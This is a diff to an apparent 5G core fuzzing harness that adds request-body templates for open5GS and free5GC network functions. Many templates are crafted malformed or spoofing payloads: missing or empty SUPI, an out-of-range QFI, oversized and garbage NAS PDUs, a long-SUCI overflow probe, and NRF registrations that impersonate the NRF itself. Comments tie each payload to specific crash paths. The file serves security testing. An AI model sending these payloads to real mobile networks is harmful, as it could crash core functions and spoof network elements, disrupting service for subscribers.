@@ -349,9 +349,10 @@ def sm_context_create(supi: str = DEFAULT_SUPI,
         },
         'ueTimeZone':            '+00:00',
         'smContextStatusUri':    f'{DEFAULT_AMF_SBI_URI}/namf-callback/v1/{supi}/sm-context-status/{pdu_session_id}',
-        'pcfId':                 '',
-        'hSmfUri':               '',
-        'additionalAnType':      '',
+        # NOTE: pcfId / hSmfUri / additionalAnType deliberately omitted — open5GS
+        # treats an empty-string hSmfUri as truthy and forces the HR-roaming path
+        # ("Full DNN required for HR Roaming"), so the SM context create never
+        # establishes.  Omitting them keeps this on the non-roaming (LBO) path.
         'epsInterworkingInd':    'NONE',
         'hoState':               'NONE',
         'toBeSwitch':            False,
@@ -594,6 +595,35 @@ def udm_auth_data_body(supi: str = DEFAULT_SUPI,
     }
 
 
+def udm_sdm_sub_create_body(supi: str = DEFAULT_SUPI,
+                            mcc: str = DEFAULT_MCC,
+                            mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
+    """POST /nudm-sdm/v2/{supi}/sdm-subscriptions — valid SdmSubscription.
+
+    Producer step of the UDM subscription-lifecycle chain: a complete body that
+    returns 201 + Location so the real subscriptionId propagates to the
+    modify / delete / use-after-delete consumer steps (open5GS rejects the
+    generic spec baseline with "No monitoredResourceUri").
+    """
+    return {
+        'nfInstanceId':         NF_INSTANCE_FUZZ,
+        'callbackReference':    f'http://127.0.0.5:7777/nudm-sdm-callback/v1/{supi}/sdm-notify',
+        'monitoredResourceUris': [f'/nudm-sdm/v2/{supi}/am-data'],
+    }
+
+
+def udm_sdm_sub_modify_body() -> list:
+    """PATCH /nudm-sdm/v2/{supi}/sdm-subscriptions/{id} — JSON-patch document.
+
+    Consumer step: a minimal RFC 6902 patch applied to the (possibly already
+    deleted) subscription id, exercising the modify / not-found handler path.
+    """
+    return [
+        {'op': 'replace', 'path': '/monitoredResourceUris/0',
+         'value': f'/nudm-sdm/v2/{DEFAULT_SUPI}/sm-data'},
+    ]
+
+
 def udm_uecm_amf_reg_body(mcc: str = DEFAULT_MCC,
                            mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
     """PUT /nudm-uecm/v1/{supi}/registrations/amf-3gpp-access body.
@@ -811,6 +841,592 @@ GPSI_VALUES = [
 
 
 # ---------------------------------------------------------------------------
+# PCF – SM Policy Control  (TS 29.512)
+# PCF – AM Policy Control  (TS 29.507)
+# PCF – Policy Authorization  (TS 29.514)
+# ---------------------------------------------------------------------------
+
+def pcf_sm_policy_create_body(supi: str = DEFAULT_SUPI,
+                               pdu_sid: int = 1,
+                               dnn: str = DEFAULT_DNN,
+                               sst: int = DEFAULT_SNSSAI_SST,
+                               sd:  str = DEFAULT_SNSSAI_SD,
+                               mcc: str = DEFAULT_MCC,
+                               mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
+    """POST /npcf-smpolicycontrol/v1/sm-policies body."""
+    return {
+        'supi':          supi,
+        'pduSessionId':  pdu_sid,
+        'pduSessionType': 'IPV4',
+        'dnn':           dnn,
+        'notificationUri': f'http://127.0.0.5:7777/nsmf-callback/v1/sm-policy-notify/{pdu_sid}/update',
+        'sNssai':        _snssai(sst, sd),
+        'servingNetwork': _plmn(mcc, mnc),
+        'ratType':       'NR',
+        'accessType':    '3GPP_ACCESS',
+        'ipv4Address':   '10.45.0.1',
+    }
+
+
+def pcf_sm_policy_create_no_supi(pdu_sid: int = 1) -> Dict[str, Any]:
+    """SM Policy create without SUPI — nil deref in PCF SUPI lookup."""
+    return {
+        'pduSessionId':  pdu_sid,
+        'pduSessionType': 'IPV4',
+        'dnn':           DEFAULT_DNN,
+        'notificationUri': f'http://127.0.0.5:7777/nsmf-callback/v1/sm-policy-notify/{pdu_sid}/update',
+    }
+
+
+def pcf_am_policy_create_body(supi: str = DEFAULT_SUPI,
+                               mcc: str = DEFAULT_MCC,
+                               mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
+    """POST /npcf-am-policy-control/v1/policies body.
+
+    suppFeat is REQUIRED by open5GS (OpenAPI_policy_association_request_parseFromJSON
+    fails with [supp_feat] otherwise → 'cannot parse HTTP message' 400).
+    """
+    return {
+        'supi':           supi,
+        'notificationUri': f'http://127.0.0.5:7777/npcf-callback/v1/am-policy-notify/{supi}',
+        'suppFeat':       '0',
+        'servingPlmn':    _plmn(mcc, mnc),
+        'accessType':     '3GPP_ACCESS',
+        'ratType':        'NR',
+    }
+
+
+def pcf_app_session_create_body(supi: str = DEFAULT_SUPI,
+                                 mcc: str = DEFAULT_MCC,
+                                 mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
+    """POST /npcf-policyauthorization/v1/app-sessions body."""
+    return {
+        'supi':           supi,
+        'ipDomain':       'internet',
+        'dnn':            DEFAULT_DNN,
+        'ipv4Addr':       '10.45.0.1',
+        'notifUri':       f'http://127.0.0.5:7777/npcf-callback/v1/app-session-notify/{supi}',
+        'servInd':        'AUDIO',
+        'medComponents': {
+            '1': {
+                'medCompN':   1,
+                'medType':    'AUDIO',
+                'fDescs':     ['permit out 17 from any to assigned 30000-30001'],
+            },
+        },
+    }
+
+
+def pcf_sm_policy_update_notify_body(pol_id: str = '1') -> Dict[str, Any]:
+    """POST /npcf-callback/v1/sm-policy-notify/{id}/update body."""
+    return {
+        'resourceUri':      f'http://127.0.0.1:7777/npcf-smpolicycontrol/v1/sm-policies/{pol_id}',
+        'smPolicyDecision': {},
+    }
+
+
+# ---------------------------------------------------------------------------
+# NSSF – Network Slice Selection  (TS 29.531)
+# ---------------------------------------------------------------------------
+
+def nssf_nsselection_query(sst: int = DEFAULT_SNSSAI_SST,
+                            sd: str = DEFAULT_SNSSAI_SD,
+                            mcc: str = DEFAULT_MCC,
+                            mnc: str = DEFAULT_MNC,
+                            nf_type: str = 'AMF') -> str:
+    """Build the GET query string for nnssf-nsselection/v2/network-slice-information."""
+    return (f'?nf-type={nf_type}&nf-id={NF_INSTANCE_FUZZ}'
+            f'&requested-nssai=%5B%7B%22sst%22%3A{sst}%7D%5D'
+            f'&home-plmn-id=%7B%22mcc%22%3A%22{mcc}%22%2C%22mnc%22%3A%22{mnc}%22%7D'
+            f'&tai=%7B%22plmnId%22%3A%7B%22mcc%22%3A%22{mcc}%22%2C%22mnc%22%3A%22{mnc}%22%7D%2C%22tac%22%3A%221%22%7D')
+
+
+def nssf_nssai_availability_body(nf_id: str = NF_INSTANCE_FUZZ,
+                                  sst: int = DEFAULT_SNSSAI_SST,
+                                  sd: str = DEFAULT_SNSSAI_SD,
+                                  mcc: str = DEFAULT_MCC,
+                                  mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
+    """PUT /nnssf-nssaiavailability/v1/nssai-availability/{nfId} body."""
+    return {
+        'supportedFeatures': '0',
+        'amfSetId':          '0x01',
+        'authorizedNssaiAvailabilityData': [
+            {
+                'tai': {'plmnId': _plmn(mcc, mnc), 'tac': '000001'},
+                'supportedSnssaiList': [_snssai(sst, sd)],
+            }
+        ],
+    }
+
+
+# ---------------------------------------------------------------------------
+# BSF – Binding Support Function  (TS 29.521)
+# ---------------------------------------------------------------------------
+
+def bsf_pcf_binding_create_body(supi: str = DEFAULT_SUPI,
+                                 mcc: str = DEFAULT_MCC,
+                                 mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
+    """POST /nbsf-management/v1/pcfBindings body."""
+    return {
+        'supi':       supi,
+        'ipv4Addr':   '10.45.0.1',
+        'dnn':        DEFAULT_DNN,
+        'pcfFqdn':    '127.0.0.1',
+        'pcfIpEndPoints': [{'ipv4Address': '127.0.0.1', 'port': 7777}],
+        'pcfId':      NF_INSTANCE_FUZZ,
+        'servingNetwork': _plmn(mcc, mnc),
+    }
+
+
+def bsf_pcf_binding_no_ip(supi: str = DEFAULT_SUPI) -> Dict[str, Any]:
+    """PCF binding without IP address — nil deref in BSF binding lookup."""
+    return {
+        'supi':   supi,
+        'dnn':    DEFAULT_DNN,
+        'pcfId':  NF_INSTANCE_FUZZ,
+    }
+
+
+# ---------------------------------------------------------------------------
+# CHF – Converged Charging  (TS 29.594)
+# ---------------------------------------------------------------------------
+
+def chf_charging_create_body(supi: str = DEFAULT_SUPI,
+                               pdu_sid: int = 1,
+                               dnn: str = DEFAULT_DNN,
+                               sst: int = DEFAULT_SNSSAI_SST,
+                               sd: str = DEFAULT_SNSSAI_SD,
+                               mcc: str = DEFAULT_MCC,
+                               mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
+    """POST /nchf-convergedcharging/v3/chargingdata body."""
+    return {
+        'supi':              supi,
+        'pduSessionId':      pdu_sid,
+        'dnn':               dnn,
+        'invocationSequenceNumber': 1,
+        'nfConsumerIdentification': {
+            'nFName':    NF_INSTANCE_FUZZ,
+            'nFIPv4Address': '127.0.0.1',
+            'nFPLMNID':  _plmn(mcc, mnc),
+            'nodeFunctionality': 'SMF',
+        },
+        'multipleUnitUsage': [
+            {
+                'ratingGroup': 1,
+                'requestedUnit': {'time': 300, 'totalVolume': 1024},
+            }
+        ],
+        'pduAddress':        {'pduIPv4Address': '10.45.0.1'},
+        'chargingId':        1,
+        'homeProvidedChargingId': 1,
+        'servingNetworkFunctionID': {
+            'servingNetworkFunctionInformation': {
+                'nFName': NF_INSTANCE_FUZZ,
+                'nFIPv4Address': '127.0.0.1',
+            },
+        },
+        'sNssai':  _snssai(sst, sd),
+        'ratType': 'NR',
+    }
+
+
+def chf_charging_update_body(pdu_sid: int = 1) -> Dict[str, Any]:
+    """POST /nchf-convergedcharging/v3/chargingdata/{ref}/update body."""
+    return {
+        'invocationSequenceNumber': 2,
+        'multipleUnitUsage': [
+            {
+                'ratingGroup':    1,
+                'usedUnitContainer': [{
+                    'serviceId':   1,
+                    'quotaManagementIndicator': 'ONLINE_CHARGING',
+                    'time':        120,
+                    'totalVolume': 512,
+                    'uplinkVolume': 256,
+                    'downlinkVolume': 256,
+                }],
+            }
+        ],
+    }
+
+
+def chf_charging_create_no_supi(pdu_sid: int = 1) -> Dict[str, Any]:
+    """CHF charging create without SUPI — nil deref in CHF SUPI lookup."""
+    return {
+        'pduSessionId': pdu_sid,
+        'dnn':          DEFAULT_DNN,
+        'invocationSequenceNumber': 1,
+    }
+
+
+# ---------------------------------------------------------------------------
+# NRF auth-bypass gap-fill  (TS 29.510 — 61 auth-bypass issues)
+# ---------------------------------------------------------------------------
+
+def nrf_profile_no_nf_type(nf_id: str) -> Dict[str, Any]:
+    """PUT /nnrf-nfm/v1/nf-instances/{id} — nfType field absent.
+
+    open5GS #4350/#4351: mandatory nfType missing — NRF dereferences
+    nfType without null-check in ogs_sbi_nf_info_add().
+    """
+    return {
+        'nfInstanceId': nf_id,
+        # nfType intentionally omitted
+        'nfStatus': 'REGISTERED',
+        'ipv4Addresses': ['127.0.0.1'],
+    }
+
+
+def nrf_profile_unknown_type(nf_id: str) -> Dict[str, Any]:
+    """PUT /nnrf-nfm/v1/nf-instances/{id} — unknown nfType enum value.
+
+    open5GS / free5GC: unrecognised nfType string falls through enum switch
+    without a default guard; may trigger OOB array access or nil deref.
+    """
+    return {
+        'nfInstanceId': nf_id,
+        'nfType':       'UNKNOWN_NF_TYPE_XYZZY',
+        'nfStatus':     'REGISTERED',
+        'ipv4Addresses': ['127.0.0.1'],
+    }
+
+
+def nrf_profile_self_as_nrf(nf_id: str, mcc: str = DEFAULT_MCC,
+                              mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
+    """PUT registering as nfType=NRF — NRF self-registration confusion.
+
+    open5GS #4467 family: NRF treats its own NF type registration differently;
+    registering as NRF exercises the nfType=NRF code path that lacks guards.
+    """
+    return {
+        'nfInstanceId': nf_id,
+        'nfType':       'NRF',
+        'nfStatus':     'REGISTERED',
+        'plmnList':     [_plmn(mcc, mnc)],
+        'ipv4Addresses': ['127.0.0.1'],
+    }
+
+
+def nrf_profile_conflicting_id(nf_id: str = '00000000-0000-0000-0000-000000000001',
+                                mcc: str = DEFAULT_MCC,
+                                mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
+    """PUT with a well-known NRF internal instance ID to spoof an existing NF.
+
+    Attempts to overwrite NRF's own internal record — auth-bypass spoofing.
+    """
+    return {
+        'nfInstanceId': nf_id,   # NRF bootstrap ID in open5GS
+        'nfType':       'NRF',
+        'nfStatus':     'REGISTERED',
+        'plmnList':     [_plmn(mcc, mnc)],
+    }
+
+
+# ---------------------------------------------------------------------------
+# SMF gap-fill  (TS 29.502 nsmf-pdusession — missing-field / bad-value attacks)
+# ---------------------------------------------------------------------------
+
+def sm_context_no_supi(pdu_sid: int = 1, dnn: str = DEFAULT_DNN,
+                        sst: int = DEFAULT_SNSSAI_SST,
+                        sd: str = DEFAULT_SNSSAI_SD,
+                        mcc: str = DEFAULT_MCC,
+                        mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
+    """POST /nsmf-pdusession/v1/sm-contexts — supi field absent.
+
+    open5GS #4453 family: SMF ogs_sbi_server_handler() dereferences supi
+    before checking if it was present; absent supi → NULL string deref.
+    """
+    return {
+        # supi intentionally omitted
+        'pduSessionId':   pdu_sid,
+        'dnn':            dnn,
+        'sNssai':         _snssai(sst, sd),
+        'servingNetwork': _plmn(mcc, mnc),
+        'requestType':    'INITIAL_REQUEST',
+        'anType':         '3GPP_ACCESS',
+    }
+
+
+def sm_context_empty_supi(pdu_sid: int = 1, dnn: str = DEFAULT_DNN,
+                           mcc: str = DEFAULT_MCC, mnc: str = DEFAULT_MNC,
+                           sst: int = DEFAULT_SNSSAI_SST,
+                           sd: str = DEFAULT_SNSSAI_SD) -> Dict[str, Any]:
+    """POST /nsmf-pdusession/v1/sm-contexts — supi="" (empty string).
+
+    Empty SUPI bypasses some format checks but still reaches ogs_id_get_type()
+    which returns NULL on empty string → assertion failure.
+    """
+    return {
+        'supi':           '',    # empty — ogs_id_get_type returns NULL
+        'pduSessionId':   pdu_sid,
+        'dnn':            dnn,
+        'sNssai':         _snssai(sst, sd),
+        'servingNetwork': _plmn(mcc, mnc),
+        'requestType':    'INITIAL_REQUEST',
+        'anType':         '3GPP_ACCESS',
+    }
+
+
+def sm_context_bad_qos(supi: str = DEFAULT_SUPI, pdu_sid: int = 1,
+                        dnn: str = DEFAULT_DNN,
+                        mcc: str = DEFAULT_MCC, mnc: str = DEFAULT_MNC,
+                        sst: int = DEFAULT_SNSSAI_SST,
+                        sd: str = DEFAULT_SNSSAI_SD) -> Dict[str, Any]:
+    """POST /nsmf-pdusession/v1/sm-contexts — QFI=256 (valid range 1-63).
+
+    out-of-range QFI exercises array index checks in SMF QoS flow allocation;
+    open5GS uses qos_flow[qfi] array indexing — QFI>63 → OOB write.
+    """
+    return {
+        'supi':             supi,
+        'pduSessionId':     pdu_sid,
+        'dnn':              dnn,
+        'sNssai':           _snssai(sst, sd),
+        'servingNetwork':   _plmn(mcc, mnc),
+        'requestType':      'INITIAL_REQUEST',
+        'anType':           '3GPP_ACCESS',
+        'qosFlows': [
+            {'qfi': 256, 'qosRules': b''.hex()},   # QFI=256 exceeds 6-bit max
+            {'qfi': 0,   'qosRules': b''.hex()},   # QFI=0 also invalid
+        ],
+    }
+
+
+def sm_context_no_dnn(supi: str = DEFAULT_SUPI, pdu_sid: int = 1,
+                       mcc: str = DEFAULT_MCC, mnc: str = DEFAULT_MNC,
+                       sst: int = DEFAULT_SNSSAI_SST,
+                       sd: str = DEFAULT_SNSSAI_SD) -> Dict[str, Any]:
+    """POST /nsmf-pdusession/v1/sm-contexts — dnn field absent.
+
+    SMF looks up DNN configuration before creating the PDU session;
+    missing dnn triggers a NULL deref in dnn lookup table traversal.
+    """
+    return {
+        'supi':           supi,
+        'pduSessionId':   pdu_sid,
+        # dnn intentionally omitted
+        'sNssai':         _snssai(sst, sd),
+        'servingNetwork': _plmn(mcc, mnc),
+        'requestType':    'INITIAL_REQUEST',
+        'anType':         '3GPP_ACCESS',
+    }
+
+
+def sm_context_invalid_pdu_type(supi: str = DEFAULT_SUPI, pdu_sid: int = 1,
+                                  dnn: str = DEFAULT_DNN,
+                                  mcc: str = DEFAULT_MCC, mnc: str = DEFAULT_MNC,
+                                  sst: int = DEFAULT_SNSSAI_SST,
+                                  sd: str = DEFAULT_SNSSAI_SD) -> Dict[str, Any]:
+    """POST /nsmf-pdusession/v1/sm-contexts — pduSessionType="IPV99".
+
+    Unknown pduSessionType enum value exercises the switch default path in
+    SMF session type allocation; open5GS may assert on unknown values.
+    """
+    return {
+        'supi':             supi,
+        'pduSessionId':     pdu_sid,
+        'dnn':              dnn,
+        'pduSessionType':   'IPV99',    # not in enum: IPV4, IPV6, IPV4V6, UNSTRUCTURED
+        'sNssai':           _snssai(sst, sd),
+        'servingNetwork':   _plmn(mcc, mnc),
+        'requestType':      'INITIAL_REQUEST',
+        'anType':           '3GPP_ACCESS',
+    }
+
+
+# ---------------------------------------------------------------------------
+# AUSF gap-fill  (TS 29.509 nausf-auth — 45 issues, 14+ severe)
+# ---------------------------------------------------------------------------
+
+def ausf_auth_bad_suci(mcc: str = DEFAULT_MCC,
+                        mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
+    """POST /nausf-auth/v1/ue-authentications — malformed SUCI format.
+
+    open5GS #4472/#4523: suci decoder ogs_nas_5gs_mobile_identity_suci_get_type()
+    accesses sub-fields without validating the SUCI routing indicator length.
+    'suci-0-' prefix without required fields triggers the underread.
+    """
+    return {
+        'supiOrSuci':         'suci-0-',    # truncated — missing MNC/MCC/routing fields
+        'servingNetworkName': f'5G:mnc{mnc}.mcc{mcc}.3gppnetwork.org',
+        'resynchronizationInfo': None,
+    }
+
+
+def ausf_auth_empty_suci(mcc: str = DEFAULT_MCC,
+                          mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
+    """POST /nausf-auth/v1/ue-authentications — empty supiOrSuci string.
+
+    Empty string bypasses suci/supi detection; ogs_id_get_type('') → NULL
+    deref on the type switch in ogs_sbi_self()->ausf_suci_authenticate_list.
+    """
+    return {
+        'supiOrSuci':         '',
+        'servingNetworkName': f'5G:mnc{mnc}.mcc{mcc}.3gppnetwork.org',
+        'resynchronizationInfo': None,
+    }
+
+
+def ausf_auth_long_suci(mcc: str = DEFAULT_MCC,
+                         mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
+    """POST /nausf-auth/v1/ue-authentications — 1024-char SUCI (overflow probe).
+
+    Stack or heap buffer allocated for SUCI parsing may be fixed-size;
+    very long input exercises the length check (or lack thereof).
+    """
+    return {
+        'supiOrSuci':         'suci-0-' + 'A' * 1017,
+        'servingNetworkName': f'5G:mnc{mnc}.mcc{mcc}.3gppnetwork.org',
+        'resynchronizationInfo': None,
+    }
+
+
+def ausf_auth_resynch(supi: str = DEFAULT_SUPI,
+                       mcc: str = DEFAULT_MCC,
+                       mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
+    """POST /nausf-auth/v1/ue-authentications — with resynchronizationInfo (AUTS).
+
+    Triggers the re-synchronization code path in AUSF which decodes AUTS;
+    malformed AUTS (wrong length / format) exercises the decoder boundary.
+    auts is 14 bytes base64-encoded; we provide 10 bytes to trigger short-read.
+    """
+    return {
+        'supiOrSuci':         supi,
+        'servingNetworkName': f'5G:mnc{mnc}.mcc{mcc}.3gppnetwork.org',
+        'resynchronizationInfo': {
+            'rand': 'AAAAAAAAAAAAAAAAAAAAAA==',    # 16 bytes (valid length)
+            'auts': 'AQIDBAUG',                   # 6 bytes (should be 14 → short read)
+        },
+    }
+
+
+def ausf_auth_wrong_network(supi: str = DEFAULT_SUPI) -> Dict[str, Any]:
+    """POST /nausf-auth/v1/ue-authentications — mismatched serving network.
+
+    Serving network name doesn't match configured PLMN; exercises the
+    network-name validation path which may NULL-deref on lookup failure.
+    """
+    return {
+        'supiOrSuci':         supi,
+        'servingNetworkName': '5G:mnc999.mcc999.3gppnetwork.org',
+        'resynchronizationInfo': None,
+    }
+
+
+# ---------------------------------------------------------------------------
+# AMF SBI gap-fill  (TS 29.518 namf-comm — garbage NAS, transfer crashes)
+# ---------------------------------------------------------------------------
+
+def amf_n1n2_garbage_nas(supi: str = DEFAULT_SUPI,
+                          pdu_sid: int = 1,
+                          mcc: str = DEFAULT_MCC,
+                          mnc: str = DEFAULT_MNC) -> Dict[str, Any]:
+    """POST /namf-comm/v1/ue-contexts/{ueId}/n1-n2-messages — garbage NAS PDU.
+
+    open5GS #4403: NAS PDU is base64-decoded then fed to ogs_nas_5gs_decode();
+    random bytes cause OOB read in the NAS message type dispatch table.
+    """
+    import base64
+    garbage = bytes([0xFF, 0x7E, 0x00, 0xAB, 0xCD, 0x01, 0xFF, 0x00] * 8)
+    return {
+        'n1MessageContainer': {
+            'n1MessageClass':   'SM',
+            'n1MessageContent': {'contentId': 'n1SmMsg'},
+        },
+        'n1SmMsg': {
+            'contentId': 'n1SmMsg',
+            'content':   base64.b64encode(garbage).decode(),
+        },
+        'pduSessionId': pdu_sid,
+        'ueContextId':  supi,
+    }
+
+
+def amf_n1n2_oversized_nas(supi: str = DEFAULT_SUPI,
+                             pdu_sid: int = 1) -> Dict[str, Any]:
+    """POST /namf-comm/v1/ue-contexts/{ueId}/n1-n2-messages — 64 KB NAS PDU.
+
+    Exercises NAS decode buffer allocation limits; heap exhaustion or
+    size-check bypass depending on implementation.
+    """
+    import base64
+    big_nas = b'\x7e\x00' + b'\x00' * 65530   # NAS header + 65530 zero bytes
+    return {
+        'n1MessageContainer': {
+            'n1MessageClass':   'SM',
+            'n1MessageContent': {'contentId': 'n1SmMsg'},
+        },
+        'n1SmMsg': {
+            'contentId': 'n1SmMsg',
+            'content':   base64.b64encode(big_nas).decode(),
+        },
+        'pduSessionId': pdu_sid,
+        'ueContextId':  supi,
+    }
+
+
+def amf_n1n2_empty_nas(supi: str = DEFAULT_SUPI,
+                        pdu_sid: int = 1) -> Dict[str, Any]:
+    """POST /namf-comm/v1/ue-contexts/{ueId}/n1-n2-messages — empty NAS PDU.
+
+    Empty base64 content; ogs_nas_5gs_decode() called with length=0 →
+    immediate NULL deref on first byte access of NAS message type.
+    """
+    return {
+        'n1MessageContainer': {
+            'n1MessageClass':   'SM',
+            'n1MessageContent': {'contentId': 'n1SmMsg'},
+        },
+        'n1SmMsg': {
+            'contentId': 'n1SmMsg',
+            'content':   '',    # empty — zero-length NAS
+        },
+        'pduSessionId': pdu_sid,
+        'ueContextId':  supi,
+    }
+
+
+def amf_ue_ctx_no_supi(mcc: str = DEFAULT_MCC,
+                        mnc: str = DEFAULT_MNC,
+                        sst: int = DEFAULT_SNSSAI_SST) -> Dict[str, Any]:
+    """PUT /namf-comm/v1/ue-contexts/{ueId} — supi field absent from body.
+
+    AMF stores the supi from the body, not just the URL path param;
+    absent body supi may diverge from path supi causing a null deref
+    in the supi comparison at context lookup.
+    """
+    return {
+        # supi intentionally omitted
+        'supiUnauthInd':      False,
+        'mmContextList':      [{'accessType': '3GPP_ACCESS', 'nasSecurityMode': {}}],
+        'sessionContextList': [],
+        'allowedNssai':       [{'allowedSnssaiList': [_snssai(sst)], 'accessType': '3GPP_ACCESS'}],
+        'traceData':          None,
+    }
+
+
+def amf_ue_ctx_bad_plmn(supi: str = DEFAULT_SUPI,
+                          sst: int = DEFAULT_SNSSAI_SST) -> Dict[str, Any]:
+    """PUT /namf-comm/v1/ue-contexts/{ueId} — PLMN mismatch between SUPI and body.
+
+    SUPI prefix (001/01) doesn't match guami plmnId (999/99);
+    AMF PLMN validation may crash when comparing mismatched network ids.
+    """
+    return {
+        'supi':               supi,
+        'supiUnauthInd':      False,
+        'mmContextList':      [{
+            'accessType': '3GPP_ACCESS',
+            'nasSecurityMode': {},
+            'ueSecurityCapability': {},
+            'allowedNssai': [_snssai(sst)],
+        }],
+        'sessionContextList': [],
+        'traceData':          None,
+    }
+
+
+# ---------------------------------------------------------------------------
 # Convenience builder: body bytes from template name + fields
 # ---------------------------------------------------------------------------
 
@@ -975,6 +1591,12 @@ def build_body(template_name: str, fields: Dict[str, Any]) -> bytes:
     elif template_name == 'udm_uecm_amf_reg':
         body_dict = udm_uecm_amf_reg_body(mcc, mnc)
 
+    elif template_name == 'udm_sdm_sub_create':
+        body_dict = udm_sdm_sub_create_body(supi, mcc, mnc)
+
+    elif template_name == 'udm_sdm_sub_modify':
+        body_dict = udm_sdm_sub_modify_body()
+
     elif template_name == 'smf_policy_notify':
         body_dict = smf_policy_notify_body(f'ctx-{pdu_sid}')
 
@@ -999,6 +1621,104 @@ def build_body(template_name: str, fields: Dict[str, Any]) -> bytes:
     elif template_name == 'amf_ue_ctx_restricted_rat':
         body_dict = ue_context_restricted_rat(supi, mcc, mnc, sst)
 
+    # ── PCF templates ─────────────────────────────────────────────────────────
+    elif template_name == 'pcf_sm_policy_create':
+        body_dict = pcf_sm_policy_create_body(supi, pdu_sid, DEFAULT_DNN, sst, sd, mcc, mnc)
+
+    elif template_name == 'pcf_sm_policy_create_no_supi':
+        body_dict = pcf_sm_policy_create_no_supi(pdu_sid)
+
+    elif template_name == 'pcf_am_policy_create':
+        body_dict = pcf_am_policy_create_body(supi, mcc, mnc)
+
+    elif template_name == 'pcf_app_session_create':
+        body_dict = pcf_app_session_create_body(supi, mcc, mnc)
+
+    elif template_name == 'pcf_sm_policy_update_notify':
+        body_dict = pcf_sm_policy_update_notify_body(f'pol-{pdu_sid}')
+
+    # ── NSSF templates ────────────────────────────────────────────────────────
+    elif template_name == 'nssf_nssai_availability':
+        body_dict = nssf_nssai_availability_body(nf_id, sst, sd, mcc, mnc)
+
+    # ── BSF templates ─────────────────────────────────────────────────────────
+    elif template_name == 'bsf_pcf_binding_create':
+        body_dict = bsf_pcf_binding_create_body(supi, mcc, mnc)
+
+    elif template_name == 'bsf_pcf_binding_no_ip':
+        body_dict = bsf_pcf_binding_no_ip(supi)
+
+    # ── CHF templates ─────────────────────────────────────────────────────────
+    elif template_name == 'chf_charging_create':
+        body_dict = chf_charging_create_body(supi, pdu_sid, DEFAULT_DNN, sst, sd, mcc, mnc)
+
+    elif template_name == 'chf_charging_update':
+        body_dict = chf_charging_update_body(pdu_sid)
+
+    elif template_name == 'chf_charging_create_no_supi':
+        body_dict = chf_charging_create_no_supi(pdu_sid)
+
+    # ── NRF auth-bypass gap-fill ──────────────────────────────────────────────
+    elif template_name == 'nrf_register_no_nf_type':
+        body_dict = nrf_profile_no_nf_type(nf_id)
+
+    elif template_name == 'nrf_register_unknown_type':
+        body_dict = nrf_profile_unknown_type(nf_id)
+
+    elif template_name == 'nrf_register_self_as_nrf':
+        body_dict = nrf_profile_self_as_nrf(nf_id, mcc, mnc)
+
+    elif template_name == 'nrf_register_conflicting_id':
+        body_dict = nrf_profile_conflicting_id(mcc=mcc, mnc=mnc)
+
+    # ── SMF gap-fill ──────────────────────────────────────────────────────────
+    elif template_name == 'smf_ctx_create_no_supi':
+        body_dict = sm_context_no_supi(pdu_sid, DEFAULT_DNN, sst, sd, mcc, mnc)
+
+    elif template_name == 'smf_ctx_create_empty_supi':
+        body_dict = sm_context_empty_supi(pdu_sid, DEFAULT_DNN, mcc, mnc, sst, sd)
+
+    elif template_name == 'smf_ctx_create_bad_qos':
+        body_dict = sm_context_bad_qos(supi, pdu_sid, DEFAULT_DNN, mcc, mnc, sst, sd)
+
+    elif template_name == 'smf_ctx_create_no_dnn':
+        body_dict = sm_context_no_dnn(supi, pdu_sid, mcc, mnc, sst, sd)
+
+    elif template_name == 'smf_ctx_create_invalid_pdu_type':
+        body_dict = sm_context_invalid_pdu_type(supi, pdu_sid, DEFAULT_DNN, mcc, mnc, sst, sd)
+
+    # ── AUSF gap-fill ─────────────────────────────────────────────────────────
+    elif template_name == 'ausf_auth_bad_suci':
+        body_dict = ausf_auth_bad_suci(mcc, mnc)
+
+    elif template_name == 'ausf_auth_empty_suci':
+        body_dict = ausf_auth_empty_suci(mcc, mnc)
+
+    elif template_name == 'ausf_auth_long_suci':
+        body_dict = ausf_auth_long_suci(mcc, mnc)
+
+    elif template_name == 'ausf_auth_resynch':
+        body_dict = ausf_auth_resynch(supi, mcc, mnc)
+
+    elif template_name == 'ausf_auth_wrong_network':
+        body_dict = ausf_auth_wrong_network(supi)
+
+    # ── AMF SBI gap-fill ──────────────────────────────────────────────────────
+    elif template_name == 'amf_n1n2_garbage_nas':
+        body_dict = amf_n1n2_garbage_nas(supi, pdu_sid, mcc, mnc)
+
+    elif template_name == 'amf_n1n2_oversized_nas':
+        body_dict = amf_n1n2_oversized_nas(supi, pdu_sid)
+
+    elif template_name == 'amf_n1n2_empty_nas':
+        body_dict = amf_n1n2_empty_nas(supi, pdu_sid)
+
+    elif template_name == 'amf_ue_ctx_no_supi':
+        body_dict = amf_ue_ctx_no_supi(mcc, mnc, sst)
+
+    elif template_name == 'amf_ue_ctx_bad_plmn':
+        body_dict = amf_ue_ctx_bad_plmn(supi, sst)
+
     # GET / DELETE requests: no body
     elif template_name in ('nrf_nf_discover', 'nrf_nf_deregister',
                            'smf_ctx_delete', 'amf_ue_ctx_get',
@@ -1008,7 +1728,21 @@ def build_body(template_name: str, fields: Dict[str, Any]) -> bytes:
                            'udm_smf_reg_psi_fuzz', 'udr_policy_supi_fuzz',
                            'udr_sub_supi_fuzz', 'udr_sub_provisioned_fuzz',
                            # cross-platform GET targets
-                           'nrf_disc_gpsi', 'nrf_disc_snssai_fuzz', 'udm_sdm_shared_data'):
+                           'nrf_disc_gpsi', 'nrf_disc_snssai_fuzz', 'udm_sdm_shared_data',
+                           # PCF/NSSF/BSF GET targets
+                           'pcf_sm_policy_get', 'nssf_nsselection',
+                           'nssf_nsselection_empty_snssai', 'nssf_nsselection_bad_plmn',
+                           'bsf_pcf_binding_get',
+                           # DELETE-only targets
+                           'pcf_sm_policy_delete', 'pcf_am_policy_delete',
+                           'bsf_pcf_binding_delete', 'chf_charging_release',
+                           'nssf_nssai_availability_delete',
